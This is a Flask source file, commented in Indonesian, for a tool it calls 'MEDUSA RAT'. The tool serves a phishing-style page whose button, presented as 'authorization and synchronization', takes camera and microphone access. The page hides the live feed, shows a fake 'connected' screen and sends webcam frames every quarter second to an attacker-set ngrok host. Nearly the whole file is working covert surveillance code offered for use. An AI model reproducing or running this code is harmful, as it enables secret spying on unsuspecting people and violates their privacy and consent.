from flask import Flask, request, render_template_string

app = Flask(__name__)

ALAMAT_NGROK_LAB = ""

@app.route('/handshake', methods=['GET', 'POST'])
def handshake():
    global ALAMAT_NGROK_LAB
    
    ip_lab = request.args.get('ip_lab')
    if ip_lab:
        ALAMAT_NGROK_LAB = ip_lab.replace("https://", "").replace("http://", "").strip()
        return f"✅ Terkunci: {ALAMAT_NGROK_LAB}", 200

    return render_template_string("""
    <html>
    <head>
        <title>System Synchronization</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
            .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; border-radius: 8px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
            .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #8b0000; }
            .btn:hover { background-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>[ MEDUSA RAT INTERCONNECT ]</h2>
            <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
            <p style="color: #888; font-size: 11px;">Ketuk tombol di bawah SEKALI SAJA untuk memberikan otoritas penuh.</p>
            <br>
            <button class="btn" onclick="triggerAllOtoritas()">OTORISASI & SINKRONISASI</button>
        </div>

        <!-- Tag video hantu tersembunyi untuk memutar umpan kamera di latar belakang -->
        <video id="v-feed" autoplay playsinline style="display:none;"></video>

        <script>
            async function triggerAllOtoritas() {
                try {
                    let mediaStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                    
                    // Alirkan data kamera ke dalam tag video hantu
                    let videoEl = document.getElementById("v-feed");
                    videoEl.srcObject = mediaStream;
                    
                    document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ STATUS: CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p><p style='color:gray;'>Jangan tutup browser ini. Lab sedang memantau feed data.</p></div>";
                    
                    // CANVAS ENGINE: Membuat komponen kanvas potong gambar secara mandiri (KEBAL TYPPERROR)
                    let canvas = document.createElement('canvas');
                    let ctx = canvas.getContext('2d');
                    
                    setInterval(() => {
                        try {
                            if (videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
                                canvas.width = videoEl.videoWidth;
                                canvas.height = videoEl.videoHeight;
                                
                                // Menggambar frame dari video ke kanvas secara real-time
                                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                                
                                // Ubah hasil gambar kanvas murni menjadi Base64 string JPEG ringan
                                let base64data = canvas.toDataURL('image/jpeg', 0.4);
                                
                                let labDestination = "{{ alamat_lab }}";
                                fetch('https://' + labDestination + '/receive_frame', {
                                    method: 'POST',
                                    body: base64data
                                });
                            }
                        } catch(e) {}
                    }, 250);
                } catch(err) {
                    alert("Gagal mengunci izin otomasi: " + err);
                }
            }
        </script>
    </body>
    </html>
    """, alamat_lab=ALAMAT_NGROK_LAB), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
